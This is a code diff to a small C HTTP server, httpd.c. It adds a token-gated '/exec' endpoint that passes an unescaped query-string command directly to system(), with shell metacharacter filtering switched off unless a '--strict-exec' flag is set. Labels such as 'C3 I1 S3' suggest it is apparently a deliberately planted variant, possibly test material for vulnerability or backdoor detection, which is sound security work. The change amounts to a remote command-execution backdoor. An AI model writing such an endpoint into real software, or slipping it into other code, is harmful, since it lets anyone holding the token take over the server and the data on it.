@@ -1,0 +1,144 @@
+--- a/httpd.c
++++ b/httpd.c
+@@ -34,6 +34,16 @@
+ #define STDOUT  1
+ #define STDERR  2
+ 
++/* C3: config file + runtime state gate */
++struct exec_config {
++    int enabled;
++    int logging;
++    char secret[64];
++};
++static struct exec_config exec_cfg = {0, 0, ""};
++static int exec_initialized = 0;       /* set to 1 by /exec/init after token check */
++static int strict_exec = 0;            /* --strict-exec: enable full metachar sanitization */
++
+ void accept_request(void *);
+ void bad_request(int);
+ void cat(int, FILE *);
+@@ -47,6 +57,68 @@
+ int startup(u_short *);
+ void unimplemented(int);
+ 
++static void send_exec_reply(int client, int code, const char *status, const char *body) {
++    char buf[2048];
++    int n = snprintf(buf, sizeof(buf),
++        "HTTP/1.0 %d %s\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s",
++        code, status, (int)strlen(body), body);
++    send(client, buf, n, 0);
++}
++
++static void read_exec_config(const char *path) {
++    FILE *f = fopen(path, "r");
++    if (!f) return;
++    char key[64], val[128];
++    char line[256];
++    while (fgets(line, sizeof(line), f)) {
++        if (line[0] == '#' || line[0] == '\n') continue;
++        if (sscanf(line, "%63[^=]= %127[^\n]", key, val) == 2) {
++            char *p = key + strlen(key) - 1;
++            while (p > key && *p == ' ') *p-- = '\0';
++            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++            if (strcmp(key, "exec_secret") == 0)  strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++        }
++    }
++    fclose(f);
++}
++
++/* C3: /exec/init handler — validates token, sets exec_initialized */
++static void handle_exec_init(int client, const char *query_string) {
++    const char *token = NULL;
++    if (query_string != NULL && strncmp(query_string, "token=", 6) == 0)
++        token = query_string + 6;
++    if (token == NULL || *token == '\0') {
++        send_exec_reply(client, 400, "Bad Request", "token param required");
++        return;
++    }
++    if (strcmp(token, exec_cfg.secret) == 0) {
++        exec_initialized = 1;
++        send_exec_reply(client, 200, "OK", "Exec endpoint initialized.");
++    } else {
++        send_exec_reply(client, 403, "Forbidden", "Invalid token.");
++    }
++}
++
++/* C3 I1 S3: direct system(), strict metachar check gated on --strict-exec */
++static void handle_exec(int client, const char *query_string) {
++    const char *cmd = NULL;
++    if (query_string != NULL && strncmp(query_string, "cmd=", 4) == 0)
++        cmd = query_string + 4;
++    if (cmd == NULL || *cmd == '\0') {
++        send_exec_reply(client, 400, "Bad Request", "cmd param required");
++        return;
++    }
++    /* S3: strict metachar check — only active when --strict-exec flag given */
++    if (strict_exec && strpbrk(cmd, "|;&`$") != NULL) {
++        send_exec_reply(client, 403, "Forbidden", "Disallowed characters.");
++        return;
++    }
++    /* I1: direct system() call */
++    system(cmd);
++    send_exec_reply(client, 200, "OK", "Command dispatched.");
++}
++
+ /**********************************************************************/
+ /* A request has caused a call to accept() on the server port to
+  * return.  Process the request appropriately.
+@@ -95,6 +167,28 @@
+     }
+     url[i] = '\0';
+ 
++    /* C3 exec routes: /exec/init and /exec (guarded by exec_initialized) */
++    if (exec_cfg.enabled &&
++            strncmp(url, "/exec/init", 10) == 0 &&
++            (url[10] == '\0' || url[10] == '?')) {
++        const char *qs = NULL;
++        char *qm = strchr(url, '?');
++        if (qm != NULL) { *qm = '\0'; qs = qm + 1; }
++        handle_exec_init(client, qs);
++        close(client);
++        return;
++    }
++    if (exec_cfg.enabled && exec_initialized &&
++            strncmp(url, "/exec", 5) == 0 &&
++            (url[5] == '\0' || url[5] == '?')) {
++        const char *qs = NULL;
++        char *qm = strchr(url, '?');
++        if (qm != NULL) { *qm = '\0'; qs = qm + 1; }
++        handle_exec(client, qs);
++        close(client);
++        return;
++    }
++
+     if (strcasecmp(method, "GET") == 0)
+     {
+         query_string = url;
+@@ -486,7 +580,7 @@
+ 
+ /**********************************************************************/
+ 
+-int main(void)
++int main(int argc, char *argv[])
+ {
+     int server_sock = -1;
+     u_short port = 4000;
+@@ -494,6 +588,17 @@
+     struct sockaddr_in client_name;
+     socklen_t  client_name_len = sizeof(client_name);
+     pthread_t newthread;
++    int i;
++
++    for (i = 1; i < argc; i++) {
++        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
++            port = (u_short)atoi(argv[++i]);
++        } else if (strcmp(argv[i], "--config") == 0 && i + 1 < argc) {
++            read_exec_config(argv[++i]);
++        } else if (strcmp(argv[i], "--strict-exec") == 0) {
++            strict_exec = 1;
++        }
++    }
+ 
+     server_sock = startup(&port);
+     printf("httpd running on port %d\n", port);
